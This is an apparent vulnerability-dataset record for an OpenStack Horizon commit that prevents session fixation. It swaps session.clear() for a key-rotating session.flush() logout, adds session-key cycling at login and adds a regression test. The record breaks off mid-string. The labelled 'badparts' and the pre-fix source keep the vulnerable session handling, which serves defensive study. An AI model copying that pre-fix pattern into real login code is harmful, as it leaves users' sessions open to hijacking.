{"https:\/\/github.com\/yjxtogo\/horizon":{"041b1c44c7d6cf5429505067c32f8f35166a8bab":{"url":"https:\/\/api.github.com\/repos\/yjxtogo\/horizon\/commits\/041b1c44c7d6cf5429505067c32f8f35166a8bab","html_url":"https:\/\/github.com\/yjxtogo\/horizon\/commit\/041b1c44c7d6cf5429505067c32f8f35166a8bab","sha":"041b1c44c7d6cf5429505067c32f8f35166a8bab","keyword":"session fixation prevent","diff":"diff --git a\/horizon\/exceptions.py b\/horizon\/exceptions.py\nindex 7af8a0a69..778719e3d 100644\n--- a\/horizon\/exceptions.py\n+++ b\/horizon\/exceptions.py\n@@ -203,7 +203,7 @@ class indicating the type of exception that was encountered will be\n     if issubclass(exc_type, UNAUTHORIZED):\n         if ignore:\n             return NotAuthorized\n-        request.session.clear()\n+        request.user_logout()\n         if not handled:\n             LOG.debug(\"Unauthorized: %s\" % exc_value)\n             # We get some pretty useless error messages back from\ndiff --git a\/horizon\/middleware.py b\/horizon\/middleware.py\nindex f20c1f09e..f141ff362 100644\n--- a\/horizon\/middleware.py\n+++ b\/horizon\/middleware.py\n@@ -49,6 +49,15 @@ def process_request(self, request):\n \n         Adds a :class:`~horizon.users.User` object to ``request.user``.\n         \"\"\"\n+        # A quick and dirty way to log users out\n+        def user_logout(request):\n+            if hasattr(request, '_cached_user'):\n+                del request._cached_user\n+            # Use flush instead of clear, so we rotate session keys in\n+            # addition to clearing all the session data\n+            request.session.flush()\n+        request.__class__.user_logout = user_logout\n+\n         request.__class__.user = users.LazyUser()\n         request.horizon = {'dashboard': None, 'panel': None}\n \ndiff --git a\/horizon\/tests\/auth_tests.py b\/horizon\/tests\/auth_tests.py\nindex ba1647777..9f295d0c0 100644\n--- a\/horizon\/tests\/auth_tests.py\n+++ b\/horizon\/tests\/auth_tests.py\n@@ -18,6 +18,8 @@\n #    License for the specific language governing permissions and limitations\n #    under the License.\n \n+import time\n+\n from django import http\n from django.core.urlresolvers import reverse\n from keystoneclient import exceptions as keystone_exceptions\n@@ -220,3 +222,53 @@ def test_logout(self):\n \n         self.assertRedirectsNoFollow(res, reverse('splash'))\n         self.assertNotIn(KEY, self.client.session)\n+\n+    def test_session_fixation(self):\n+        session_ids = []\n+        form_data = {'method': 'Login',\n+                     'region': 'http:\/\/localhost:5000\/v2.0',\n+                     'password': self.user.password,\n+                     'username': self.user.name}\n+\n+        self.mox.StubOutWithMock(api, 'token_create')\n+        self.mox.StubOutWithMock(api, 'tenant_list_for_token')\n+        self.mox.StubOutWithMock(api, 'token_create_scoped')\n+\n+        aToken = self.tokens.unscoped_token\n+        bToken = self.tokens.scoped_token\n+\n+        api.token_create(IsA(http.HttpRequest), \"\", self.user.name,\n+                         self.user.password).AndReturn(aToken)\n+        api.tenant_list_for_token(IsA(http.HttpRequest),\n+                                  aToken.id).AndReturn([self.tenants.first()])\n+        api.token_create_scoped(IsA(http.HttpRequest),\n+                                self.tenant.id,\n+                                aToken.id).AndReturn(bToken)\n+\n+        api.token_create(IsA(http.HttpRequest), \"\", self.user.name,\n+                         self.user.password).AndReturn(aToken)\n+        api.tenant_list_for_token(IsA(http.HttpRequest),\n+                                  aToken.id).AndReturn([self.tenants.first()])\n+        api.token_create_scoped(IsA(http.HttpRequest),\n+                                self.tenant.id,\n+                                aToken.id).AndReturn(bToken)\n+        self.mox.ReplayAll()\n+\n+        res = self.client.get(reverse('horizon:auth_login'))\n+        self.assertEqual(res.cookies.get('sessionid'), None)\n+        res = self.client.post(reverse('horizon:auth_login'), form_data)\n+        session_ids.append(res.cookies['sessionid'].value)\n+\n+        self.assertEquals(self.client.session['user_name'],\n+                          self.user.name)\n+        self.client.session['foobar'] = 'MY TEST VALUE'\n+        res = self.client.get(reverse('horizon:auth_logout'))\n+        session_ids.append(res.cookies['sessionid'].value)\n+        self.assertEqual(len(self.client.session.items()), 0)\n+        # Sleep for 1 second so the session values are different if\n+        # using the signed_cookies backend.\n+        time.sleep(1)\n+        res = self.client.post(reverse('horizon:auth_login'), form_data)\n+        session_ids.append(res.cookies['sessionid'].value)\n+        # Make sure all 3 session id values are different\n+        self.assertEqual(len(session_ids), len(set(session_ids)))\ndiff --git a\/horizon\/users.py b\/horizon\/users.py\nindex f5dcde81a..6e6be8e5a 100644\n--- a\/horizon\/users.py\n+++ b\/horizon\/users.py\n@@ -59,7 +59,7 @@ def get_user_from_request(request):\n         # If any of those keys are missing from the session it is\n         # overwhelmingly likely that we're dealing with an outdated session.\n         LOG.exception(\"Error while creating User from session.\")\n-        request.session.clear()\n+        request.user_logout()\n         raise exceptions.NotAuthorized(_(\"Your session has expired. \"\n                                          \"Please log in again.\"))\n \ndiff --git a\/horizon\/views\/auth.py b\/horizon\/views\/auth.py\nindex b48f24a65..5120eed76 100644\n--- a\/horizon\/views\/auth.py\n+++ b\/horizon\/views\/auth.py\n@@ -96,6 +96,6 @@ def switch_tenants(request, tenant_id):\n \n def logout(request):\n     \"\"\" Clears the session and logs the current user out. \"\"\"\n-    request.session.clear()\n+    request.user_logout()\n     # FIXME(gabriel): we don't ship a view named splash\n     return shortcuts.redirect('splash')\ndiff --git a\/horizon\/views\/auth_forms.py b\/horizon\/views\/auth_forms.py\nindex 287448685..2ebecfcda 100644\n--- a\/horizon\/views\/auth_forms.py\n+++ b\/horizon\/views\/auth_forms.py\n@@ -77,6 +77,16 @@ def __init__(self, *args, **kwargs):\n             self.fields['region'].widget = forms.widgets.HiddenInput()\n \n     def handle(self, request, data):\n+        if 'user_name' in request.session:\n+            if request.session['user_name'] != data['username']:\n+                # To avoid reusing another user's session, create a\n+                # new, empty session if the existing session\n+                # corresponds to a different authenticated user.\n+                request.session.flush()\n+        # Always cycle the session key when viewing the login form to\n+        # prevent session fixation\n+        request.session.cycle_key()\n+\n         # For now we'll allow fallback to OPENSTACK_KEYSTONE_URL if the\n         # form post doesn't include a region.\n         endpoint = data.get('region', None) or settings.OPENSTACK_KEYSTONE_URL\n@@ -116,7 +126,7 @@ def handle(self, request, data):\n                 # If we get here we don't want to show a stack trace to the\n                 # user. However, if we fail here, there may be bad session\n                 # data that's been cached already.\n-                request.session.clear()\n+                request.user_logout()\n                 exceptions.handle(request,\n                                   message=_(\"An error occurred authenticating.\"\n                                             \" Please try again later.\"),\n","message":"","files":{"\/horizon\/exceptions.py":{"changes":[{"diff":"\n     if issubclass(exc_type, UNAUTHORIZED):\n         if ignore:\n             return NotAuthorized\n-        request.session.clear()\n+        request.user_logout()\n         if not handled:\n             LOG.debug(\"Unauthorized: %s\" % exc_value)\n             # We get some pretty useless error messages back from","add":1,"remove":1,"filename":"\/horizon\/exceptions.py","badparts":["        request.session.clear()"],"goodparts":["        request.user_logout()"]},{"diff":"\n     if issubclass(exc_type, UNAUTHORIZED):\n         if ignore:\n             return NotAuthorized\n-        request.session.clear()\n+        request.user_logout()\n         if not handled:\n             LOG.debug(\"Unauthorized: %s\" % exc_value)\n             # We get some pretty useless error messages back from","add":1,"remove":1,"filename":"\/horizon\/exceptions.py","badparts":["        request.session.clear()"],"goodparts":["        request.user_logout()"]}],"source":"\n \"\"\" Exceptions raised by the Horizon code and the machinery for handling them. \"\"\" import logging import sys from django.conf import settings from django.contrib import messages from django.utils.translation import ugettext as _ from cloudfiles import errors as swiftclient from glanceclient.common import exceptions as glanceclient from keystoneclient import exceptions as keystoneclient from novaclient import exceptions as novaclient LOG=logging.getLogger(__name__) class HorizonException(Exception): \"\"\" Base exception class for distinguishing our own exception classes. \"\"\" pass class Http302(HorizonException): \"\"\" Error class which can be raised from within a handler to cause an early bailout and redirect at the middleware level. \"\"\" status_code=302 def __init__(self, location, message=None): self.location=location self.message=message class NotAuthorized(HorizonException): \"\"\" Raised whenever a user attempts to access a resource which they do not have role-based access to(such as when failing the :func:`~horizon.decorators.require_roles` decorator). The included:class:`~horizon.middleware.HorizonMiddleware` catches ``NotAuthorized`` and handles it gracefully by displaying an error message and redirecting the user to a login page. \"\"\" status_code=401 class NotAuthenticated(HorizonException): \"\"\" Raised when a user is trying to make requests and they are not logged in. The included:class:`~horizon.middleware.HorizonMiddleware` catches ``NotAuthenticated`` and handles it gracefully by displaying an error message and redirecting the user to a login page. \"\"\" status_code=403 class NotFound(HorizonException): \"\"\" Generic error to replace all \"Not Found\"-type API errors. \"\"\" status_code=404 class RecoverableError(HorizonException): \"\"\" Generic error to replace any \"Recoverable\"-type API errors. \"\"\" status_code=100 class ServiceCatalogException(HorizonException): \"\"\" Raised when a requested service is not available in the ``ServiceCatalog`` returned by Keystone. \"\"\" def __init__(self, service_name): message='Invalid service catalog service: %s' % service_name super(ServiceCatalogException, self).__init__(message) class AlreadyExists(HorizonException): \"\"\" Exception to be raised when trying to create an API resource which already exists. \"\"\" def __init__(self, name, resource_type): self.attrs={\"name\": name, \"resource\": resource_type} self.msg='A %(resource)s with the name \"%(name)s\" already exists.' def __repr__(self): return self.msg % self.attrs def __unicode__(self): return _(self.msg) % self.attrs class HandledException(HorizonException): \"\"\" Used internally to track exceptions that have gone through :func:`horizon.exceptions.handle` more than once. \"\"\" def __init__(self, wrapped): self.wrapped=wrapped HORIZON_CONFIG=getattr(settings, \"HORIZON_CONFIG\",{}) EXCEPTION_CONFIG=HORIZON_CONFIG.get(\"exceptions\",{}) UNAUTHORIZED=(keystoneclient.Unauthorized, keystoneclient.Forbidden, novaclient.Unauthorized, novaclient.Forbidden, glanceclient.AuthorizationFailure, glanceclient.Unauthorized, swiftclient.AuthenticationFailed, swiftclient.AuthenticationError) UNAUTHORIZED +=tuple(EXCEPTION_CONFIG.get('unauthorized',[])) NOT_FOUND=(keystoneclient.NotFound, novaclient.NotFound, glanceclient.NotFound, swiftclient.NoSuchContainer, swiftclient.NoSuchObject) NOT_FOUND +=tuple(EXCEPTION_CONFIG.get('not_found',[])) RECOVERABLE=(keystoneclient.ClientException, keystoneclient.AuthorizationFailure, novaclient.ClientException, glanceclient.ClientException, swiftclient.Error, AlreadyExists) RECOVERABLE +=tuple(EXCEPTION_CONFIG.get('recoverable',[])) def handle(request, message=None, redirect=None, ignore=False, escalate=False): \"\"\" Centralized error handling for Horizon. Because Horizon consumes so many different APIs with completely different ``Exception`` types, it's necessary to have a centralized place for handling exceptions which may be raised. Exceptions are roughly divided into 3 types: problems. These result in being logged out and sent to the login screen. located via the API. These generally result in a user-facing error message, but are otherwise returned to the normal code flow. Optionally a redirect value may be passed to the error handler so users are returned to a different view than the one requested in addition to the error message. but drop directly back to the regular code flow. All other exceptions bubble the stack as normal unless the ``ignore`` argument is passed in as ``True``, in which case only unrecognized errors are bubbled. If the exception is not re-raised, an appropriate wrapper exception class indicating the type of exception that was encountered will be returned. \"\"\" exc_type, exc_value, exc_traceback=sys.exc_info() handled=issubclass(exc_type, HandledException) wrap=False if handled: exc_type, exc_value, exc_traceback=exc_value.wrapped wrap=True if issubclass(exc_type, HorizonException): message=exc_value elif message and \"%(exc)s\" in message: message=message %{\"exc\": exc_value} if issubclass(exc_type, UNAUTHORIZED): if ignore: return NotAuthorized request.session.clear() if not handled: LOG.debug(\"Unauthorized: %s\" % exc_value) fallback=_(\"Unauthorized. Please try logging in again.\") messages.error(request, message or fallback, extra_tags=\"login\") raise NotAuthorized if issubclass(exc_type, NOT_FOUND): wrap=True if not ignore and not handled: LOG.debug(\"Not Found: %s\" % exc_value) messages.error(request, message or exc_value) if redirect: raise Http302(redirect) if not escalate: return NotFound if issubclass(exc_type, RECOVERABLE): wrap=True if not ignore and not handled: LOG.debug(\"Recoverable error: %s\" % exc_value) messages.error(request, message or exc_value) if redirect: raise Http302(redirect) if not escalate: return RecoverableError if wrap: raise HandledException([exc_type, exc_value, exc_traceback]) raise exc_type, exc_value, exc_traceback ","sourceWithComments":"# vim: tabstop=4 shiftwidth=4 softtabstop=4\n\n# Copyright 2012 Nebula, Inc.\n#\n#    Licensed under the Apache License, Version 2.0 (the \"License\"); you may\n#    not use this file except in compliance with the License. You may obtain\n#    a copy of the License at\n#\n#         http:\/\/www.apache.org\/licenses\/LICENSE-2.0\n#\n#    Unless required by applicable law or agreed to in writing, software\n#    distributed under the License is distributed on an \"AS IS\" BASIS, WITHOUT\n#    WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the\n#    License for the specific language governing permissions and limitations\n#    under the License.\n\n\"\"\"\nExceptions raised by the Horizon code and the machinery for handling them.\n\"\"\"\n\nimport logging\nimport sys\n\nfrom django.conf import settings\nfrom django.contrib import messages\nfrom django.utils.translation import ugettext as _\nfrom cloudfiles import errors as swiftclient\nfrom glanceclient.common import exceptions as glanceclient\nfrom keystoneclient import exceptions as keystoneclient\nfrom novaclient import exceptions as novaclient\n\n\nLOG = logging.getLogger(__name__)\n\n\nclass HorizonException(Exception):\n    \"\"\" Base exception class for distinguishing our own exception classes. \"\"\"\n    pass\n\n\nclass Http302(HorizonException):\n    \"\"\"\n    Error class which can be raised from within a handler to cause an\n    early bailout and redirect at the middleware level.\n    \"\"\"\n    status_code = 302\n\n    def __init__(self, location, message=None):\n        self.location = location\n        self.message = message\n\n\nclass NotAuthorized(HorizonException):\n    \"\"\"\n    Raised whenever a user attempts to access a resource which they do not\n    have role-based access to (such as when failing the\n    :func:`~horizon.decorators.require_roles` decorator).\n\n    The included :class:`~horizon.middleware.HorizonMiddleware` catches\n    ``NotAuthorized`` and handles it gracefully by displaying an error\n    message and redirecting the user to a login page.\n    \"\"\"\n    status_code = 401\n\n\nclass NotAuthenticated(HorizonException):\n    \"\"\"\n    Raised when a user is trying to make requests and they are not logged in.\n\n    The included :class:`~horizon.middleware.HorizonMiddleware` catches\n    ``NotAuthenticated`` and handles it gracefully by displaying an error\n    message and redirecting the user to a login page.\n    \"\"\"\n    status_code = 403\n\n\nclass NotFound(HorizonException):\n    \"\"\" Generic error to replace all \"Not Found\"-type API errors. \"\"\"\n    status_code = 404\n\n\nclass RecoverableError(HorizonException):\n    \"\"\" Generic error to replace any \"Recoverable\"-type API errors. \"\"\"\n    status_code = 100  # HTTP status code \"Continue\"\n\n\nclass ServiceCatalogException(HorizonException):\n    \"\"\"\n    Raised when a requested service is not available in the ``ServiceCatalog``\n    returned by Keystone.\n    \"\"\"\n    def __init__(self, service_name):\n        message = 'Invalid service catalog service: %s' % service_name\n        super(ServiceCatalogException, self).__init__(message)\n\n\nclass AlreadyExists(HorizonException):\n    \"\"\"\n    Exception to be raised when trying to create an API resource which\n    already exists.\n    \"\"\"\n    def __init__(self, name, resource_type):\n        self.attrs = {\"name\": name, \"resource\": resource_type}\n        self.msg = 'A %(resource)s with the name \"%(name)s\" already exists.'\n\n    def __repr__(self):\n        return self.msg % self.attrs\n\n    def __unicode__(self):\n        return _(self.msg) % self.attrs\n\n\nclass HandledException(HorizonException):\n    \"\"\"\n    Used internally to track exceptions that have gone through\n    :func:`horizon.exceptions.handle` more than once.\n    \"\"\"\n    def __init__(self, wrapped):\n        self.wrapped = wrapped\n\n\nHORIZON_CONFIG = getattr(settings, \"HORIZON_CONFIG\", {})\nEXCEPTION_CONFIG = HORIZON_CONFIG.get(\"exceptions\", {})\n\n\nUNAUTHORIZED = (keystoneclient.Unauthorized,\n                keystoneclient.Forbidden,\n                novaclient.Unauthorized,\n                novaclient.Forbidden,\n                glanceclient.AuthorizationFailure,\n                glanceclient.Unauthorized,\n                swiftclient.AuthenticationFailed,\n                swiftclient.AuthenticationError)\nUNAUTHORIZED += tuple(EXCEPTION_CONFIG.get('unauthorized', []))\n\nNOT_FOUND = (keystoneclient.NotFound,\n             novaclient.NotFound,\n             glanceclient.NotFound,\n             swiftclient.NoSuchContainer,\n             swiftclient.NoSuchObject)\nNOT_FOUND += tuple(EXCEPTION_CONFIG.get('not_found', []))\n\n\n# NOTE(gabriel): This is very broad, and may need to be dialed in.\nRECOVERABLE = (keystoneclient.ClientException,\n               # AuthorizationFailure is raised when Keystone is \"unavailable\".\n               keystoneclient.AuthorizationFailure,\n               novaclient.ClientException,\n               glanceclient.ClientException,\n               swiftclient.Error,\n               AlreadyExists)\nRECOVERABLE += tuple(EXCEPTION_CONFIG.get('recoverable', []))\n\n\ndef handle(request, message=None, redirect=None, ignore=False, escalate=False):\n    \"\"\" Centralized error handling for Horizon.\n\n    Because Horizon consumes so many different APIs with completely\n    different ``Exception`` types, it's necessary to have a centralized\n    place for handling exceptions which may be raised.\n\n    Exceptions are roughly divided into 3 types:\n\n    #. ``UNAUTHORIZED``: Errors resulting from authentication or authorization\n       problems. These result in being logged out and sent to the login screen.\n    #. ``NOT_FOUND``: Errors resulting from objects which could not be\n       located via the API. These generally result in a user-facing error\n       message, but are otherwise returned to the normal code flow. Optionally\n       a redirect value may be passed to the error handler so users are\n       returned to a different view than the one requested in addition to the\n       error message.\n    #. RECOVERABLE: Generic API errors which generate a user-facing message\n       but drop directly back to the regular code flow.\n\n    All other exceptions bubble the stack as normal unless the ``ignore``\n    argument is passed in as ``True``, in which case only unrecognized\n    errors are bubbled.\n\n    If the exception is not re-raised, an appropriate wrapper exception\n    class indicating the type of exception that was encountered will be\n    returned.\n    \"\"\"\n    exc_type, exc_value, exc_traceback = sys.exc_info()\n\n    # Because the same exception may travel through this method more than\n    # once (if it's re-raised) we may want to treat it differently\n    # the second time (e.g. no user messages\/logging).\n    handled = issubclass(exc_type, HandledException)\n    wrap = False\n\n    # Restore our original exception information, but re-wrap it at the end\n    if handled:\n        exc_type, exc_value, exc_traceback = exc_value.wrapped\n        wrap = True\n\n    # We trust messages from our own exceptions\n    if issubclass(exc_type, HorizonException):\n        message = exc_value\n    # If the message has a placeholder for the exception, fill it in\n    elif message and \"%(exc)s\" in message:\n        message = message % {\"exc\": exc_value}\n\n    if issubclass(exc_type, UNAUTHORIZED):\n        if ignore:\n            return NotAuthorized\n        request.session.clear()\n        if not handled:\n            LOG.debug(\"Unauthorized: %s\" % exc_value)\n            # We get some pretty useless error messages back from\n            # some clients, so let's define our own fallback.\n            fallback = _(\"Unauthorized. Please try logging in again.\")\n            messages.error(request, message or fallback, extra_tags=\"login\")\n        raise NotAuthorized  # Redirect handled in middleware\n\n    if issubclass(exc_type, NOT_FOUND):\n        wrap = True\n        if not ignore and not handled:\n            LOG.debug(\"Not Found: %s\" % exc_value)\n            messages.error(request, message or exc_value)\n        if redirect:\n            raise Http302(redirect)\n        if not escalate:\n            return NotFound  # return to normal code flow\n\n    if issubclass(exc_type, RECOVERABLE):\n        wrap = True\n        if not ignore and not handled:\n            LOG.debug(\"Recoverable error: %s\" % exc_value)\n            messages.error(request, message or exc_value)\n        if redirect:\n            raise Http302(redirect)\n        if not escalate:\n            return RecoverableError  # return to normal code flow\n\n    # If we've gotten here, time to wrap and\/or raise our exception.\n    if wrap:\n        raise HandledException([exc_type, exc_value, exc_traceback])\n    raise exc_type, exc_value, exc_traceback\n"},"\/horizon\/users.py":{"changes":[{"diff":"\n         # If any of those keys are missing from the session it is\n         # overwhelmingly likely that we're dealing with an outdated session.\n         LOG.exception(\"Error while creating User from session.\")\n-        request.session.clear()\n+        request.user_logout()\n         raise exceptions.NotAuthorized(_(\"Your session has expired. \"\n                                          \"Please log in again.\")","add":1,"remove":1,"filename":"\/horizon\/users.py","badparts":["        request.session.clear()"],"goodparts":["        request.user_logout()"]},{"diff":"\n         # If any of those keys are missing from the session it is\n         # overwhelmingly likely that we're dealing with an outdated session.\n         LOG.exception(\"Error while creating User from session.\")\n-        request.session.clear()\n+        request.user_logout()\n         raise exceptions.NotAuthorized(_(\"Your session has expired. \"\n                                          \"Please log in again.\")","add":1,"remove":1,"filename":"\/horizon\/users.py","badparts":["        request.session.clear()"],"goodparts":["        request.user_logout()"]}],"source":"\n \"\"\" Classes and methods related to user handling in Horizon. \"\"\" import logging from django.utils.translation import ugettext as _ from horizon import api from horizon import exceptions LOG=logging.getLogger(__name__) def get_user_from_request(request): \"\"\" Checks the current session and returns a:class:`~horizon.users.User`. If the session contains user data the User will be treated as authenticated and the:class:`~horizon.users.User` will have all its attributes set. If not, the:class:`~horizon.users.User` will have no attributes set. If the session contains invalid data, :exc:`~horizon.exceptions.NotAuthorized` will be raised. \"\"\" if 'user_id' not in request.session: return User() try: return User(id=request.session['user_id'], token=request.session['token'], user=request.session['user_name'], tenant_id=request.session['tenant_id'], tenant_name=request.session['tenant'], service_catalog=request.session['serviceCatalog'], roles=request.session['roles'], request=request) except KeyError: LOG.exception(\"Error while creating User from session.\") request.session.clear() raise exceptions.NotAuthorized(_(\"Your session has expired. \" \"Please log in again.\")) class LazyUser(object): def __get__(self, request, obj_type=None): if not hasattr(request, '_cached_user'): request._cached_user=get_user_from_request(request) return request._cached_user class User(object): \"\"\" The main user class which Horizon expects. .. attribute:: token The id of the Keystone token associated with the current user\/tenant. .. attribute:: username The name of the current user. .. attribute:: tenant_id The id of the Keystone tenant for the current user\/token. .. attribute:: tenant_name The name of the Keystone tenant for the current user\/token. .. attribute:: service_catalog The ``ServiceCatalog`` data returned by Keystone. .. attribute:: roles A list of dictionaries containing role names and ids as returned by Keystone. .. attribute:: admin Boolean value indicating whether or not this user has admin privileges. Internally mapped to:meth:`horizon.users.User.is_admin`. \"\"\" def __init__(self, id=None, token=None, user=None, tenant_id=None, service_catalog=None, tenant_name=None, roles=None, authorized_tenants=None, request=None): self.id=id self.token=token self.username=user self.tenant_id=tenant_id self.tenant_name=tenant_name self.service_catalog=service_catalog self.roles=roles or[] self._authorized_tenants=authorized_tenants self._request=request def is_authenticated(self): \"\"\" Evaluates whether this:class:`.User` instance has been authenticated. Returns ``True`` or ``False``. \"\"\" return self.token @property def admin(self): return self.is_admin() def is_admin(self): \"\"\" Evaluates whether this user has admin privileges. Returns ``True`` or ``False``. \"\"\" for role in self.roles: if role['name'].lower()=='admin': return True return False def get_and_delete_messages(self): \"\"\" Placeholder function for parity with ``django.contrib.auth.models.User``. \"\"\" return[] @property def authorized_tenants(self): if self.is_authenticated() and self._authorized_tenants is None: try: token=self._request.session.get(\"unscoped_token\", self.token) authd=api.tenant_list_for_token(self._request, token) except: authd=[] LOG.exception('Could not retrieve tenant list.') self._authorized_tenants=authd return self._authorized_tenants @authorized_tenants.setter def authorized_tenants(self, tenant_list): self._authorized_tenants=tenant_list ","sourceWithComments":"# vim: tabstop=4 shiftwidth=4 softtabstop=4\n\n# Copyright 2012 United States Government as represented by the\n# Administrator of the National Aeronautics and Space Administration.\n# All Rights Reserved.\n#\n# Copyright 2012 Nebula, Inc.\n#\n#    Licensed under the Apache License, Version 2.0 (the \"License\"); you may\n#    not use this file except in compliance with the License. You may obtain\n#    a copy of the License at\n#\n#         http:\/\/www.apache.org\/licenses\/LICENSE-2.0\n#\n#    Unless required by applicable law or agreed to in writing, software\n#    distributed under the License is distributed on an \"AS IS\" BASIS, WITHOUT\n#    WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the\n#    License for the specific language governing permissions and limitations\n#    under the License.\n\"\"\"\nClasses and methods related to user handling in Horizon.\n\"\"\"\n\nimport logging\n\nfrom django.utils.translation import ugettext as _\n\nfrom horizon import api\nfrom horizon import exceptions\n\n\nLOG = logging.getLogger(__name__)\n\n\ndef get_user_from_request(request):\n    \"\"\" Checks the current session and returns a :class:`~horizon.users.User`.\n\n    If the session contains user data the User will be treated as\n    authenticated and the :class:`~horizon.users.User` will have all\n    its attributes set.\n\n    If not, the :class:`~horizon.users.User` will have no attributes set.\n\n    If the session contains invalid data,\n    :exc:`~horizon.exceptions.NotAuthorized` will be raised.\n    \"\"\"\n    if 'user_id' not in request.session:\n        return User()\n    try:\n        return User(id=request.session['user_id'],\n                    token=request.session['token'],\n                    user=request.session['user_name'],\n                    tenant_id=request.session['tenant_id'],\n                    tenant_name=request.session['tenant'],\n                    service_catalog=request.session['serviceCatalog'],\n                    roles=request.session['roles'],\n                    request=request)\n    except KeyError:\n        # If any of those keys are missing from the session it is\n        # overwhelmingly likely that we're dealing with an outdated session.\n        LOG.exception(\"Error while creating User from session.\")\n        request.session.clear()\n        raise exceptions.NotAuthorized(_(\"Your session has expired. \"\n                                         \"Please log in again.\"))\n\n\nclass LazyUser(object):\n    def __get__(self, request, obj_type=None):\n        if not hasattr(request, '_cached_user'):\n            request._cached_user = get_user_from_request(request)\n        return request._cached_user\n\n\nclass User(object):\n    \"\"\" The main user class which Horizon expects.\n\n    .. attribute:: token\n\n        The id of the Keystone token associated with the current user\/tenant.\n\n    .. attribute:: username\n\n        The name of the current user.\n\n    .. attribute:: tenant_id\n\n        The id of the Keystone tenant for the current user\/token.\n\n    .. attribute:: tenant_name\n\n        The name of the Keystone tenant for the current user\/token.\n\n    .. attribute:: service_catalog\n\n        The ``ServiceCatalog`` data returned by Keystone.\n\n    .. attribute:: roles\n\n        A list of dictionaries containing role names and ids as returned\n        by Keystone.\n\n    .. attribute:: admin\n\n        Boolean value indicating whether or not this user has admin\n        privileges. Internally mapped to :meth:`horizon.users.User.is_admin`.\n    \"\"\"\n    def __init__(self, id=None, token=None, user=None, tenant_id=None,\n                    service_catalog=None, tenant_name=None, roles=None,\n                    authorized_tenants=None, request=None):\n        self.id = id\n        self.token = token\n        self.username = user\n        self.tenant_id = tenant_id\n        self.tenant_name = tenant_name\n        self.service_catalog = service_catalog\n        self.roles = roles or []\n        self._authorized_tenants = authorized_tenants\n        # Store the request for lazy fetching of auth'd tenants\n        self._request = request\n\n    def is_authenticated(self):\n        \"\"\"\n        Evaluates whether this :class:`.User` instance has been authenticated.\n        Returns ``True`` or ``False``.\n        \"\"\"\n        # TODO: deal with token expiration\n        return self.token\n\n    @property\n    def admin(self):\n        return self.is_admin()\n\n    def is_admin(self):\n        \"\"\"\n        Evaluates whether this user has admin privileges. Returns\n        ``True`` or ``False``.\n        \"\"\"\n        for role in self.roles:\n            if role['name'].lower() == 'admin':\n                return True\n        return False\n\n    def get_and_delete_messages(self):\n        \"\"\"\n        Placeholder function for parity with\n        ``django.contrib.auth.models.User``.\n        \"\"\"\n        return []\n\n    @property\n    def authorized_tenants(self):\n        if self.is_authenticated() and self._authorized_tenants is None:\n            try:\n                token = self._request.session.get(\"unscoped_token\", self.token)\n                authd = api.tenant_list_for_token(self._request, token)\n            except:\n                authd = []\n                LOG.exception('Could not retrieve tenant list.')\n            self._authorized_tenants = authd\n        return self._authorized_tenants\n\n    @authorized_tenants.setter\n    def authorized_tenants(self, tenant_list):\n        self._authorized_tenants = tenant_list\n"},"\/horizon\/views\/auth.py":{"changes":[{"diff":"\n \n def logout(request):\n     \"\"\" Clears the session and logs the current user out. \"\"\"\n-    request.session.clear()\n+    request.user_logout()\n     # FIXME(gabriel): we don't ship a view named splash\n     return shortcuts.redirect('spla","add":1,"remove":1,"filename":"\/horizon\/views\/auth.py","badparts":["    request.session.clear()"],"goodparts":["    request.user_logout()"]},{"diff":"\n \n def logout(request):\n     \"\"\" Clears the session and logs the current user out. \"\"\"\n-    request.session.clear()\n+    request.user_logout()\n     # FIXME(gabriel): we don't ship a view named splash\n     return shortcuts.redirect('spla","add":1,"remove":1,"filename":"\/horizon\/views\/auth.py","badparts":["    request.session.clear()"],"goodparts":["    request.user_logout()"]}],"source":"\n import logging from django import shortcuts from django.conf import settings from django.contrib.auth import REDIRECT_FIELD_NAME from django.utils.translation import ugettext as _ import horizon from horizon import api from horizon import exceptions from horizon import forms from horizon import users from horizon.base import Horizon from horizon.views.auth_forms import Login, LoginWithTenant, _set_session_data LOG=logging.getLogger(__name__) def user_home(request): \"\"\" Reversible named view to direct a user to the appropriate homepage. \"\"\" return shortcuts.redirect(horizon.get_user_home(request.user)) class LoginView(forms.ModalFormView): \"\"\" Logs in a user and redirects them to the URL specified by :func:`horizon.get_user_home`. \"\"\" form_class=Login template_name=\"horizon\/auth\/login.html\" def get_context_data(self, **kwargs): context=super(LoginView, self).get_context_data(**kwargs) redirect_to=self.request.REQUEST.get(REDIRECT_FIELD_NAME, \"\") context[\"redirect_field_name\"]=REDIRECT_FIELD_NAME context[\"next\"]=redirect_to return context def get_initial(self): initial=super(LoginView, self).get_initial() current_region=self.request.session.get('region_endpoint', None) requested_region=self.request.GET.get('region', None) regions=dict(getattr(settings, \"AVAILABLE_REGIONS\",[])) if requested_region in regions and requested_region !=current_region: initial.update({'region': requested_region}) return initial def switch_tenants(request, tenant_id): \"\"\" Swaps a user from one tenant to another using the unscoped token from Keystone to exchange scoped tokens for the new tenant. \"\"\" form, handled=LoginWithTenant.maybe_handle( request, initial={'tenant': tenant_id, 'username': request.user.username}) if handled: return handled unscoped_token=request.session.get('unscoped_token', None) if unscoped_token: try: token=api.token_create_scoped(request, tenant_id, unscoped_token) _set_session_data(request, token) user=users.User(users.get_user_from_request(request)) return shortcuts.redirect(Horizon.get_user_home(user)) except: exceptions.handle(request, _(\"You are not authorized for that tenant.\")) return shortcuts.redirect(\"horizon:auth_login\") def logout(request): \"\"\" Clears the session and logs the current user out. \"\"\" request.session.clear() return shortcuts.redirect('splash') ","sourceWithComments":"# vim: tabstop=4 shiftwidth=4 softtabstop=4\n\n# Copyright 2012 United States Government as represented by the\n# Administrator of the National Aeronautics and Space Administration.\n# All Rights Reserved.\n#\n# Copyright 2012 Nebula, Inc.\n#\n#    Licensed under the Apache License, Version 2.0 (the \"License\"); you may\n#    not use this file except in compliance with the License. You may obtain\n#    a copy of the License at\n#\n#         http:\/\/www.apache.org\/licenses\/LICENSE-2.0\n#\n#    Unless required by applicable law or agreed to in writing, software\n#    distributed under the License is distributed on an \"AS IS\" BASIS, WITHOUT\n#    WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the\n#    License for the specific language governing permissions and limitations\n#    under the License.\n\nimport logging\n\nfrom django import shortcuts\nfrom django.conf import settings\nfrom django.contrib.auth import REDIRECT_FIELD_NAME\nfrom django.utils.translation import ugettext as _\n\nimport horizon\nfrom horizon import 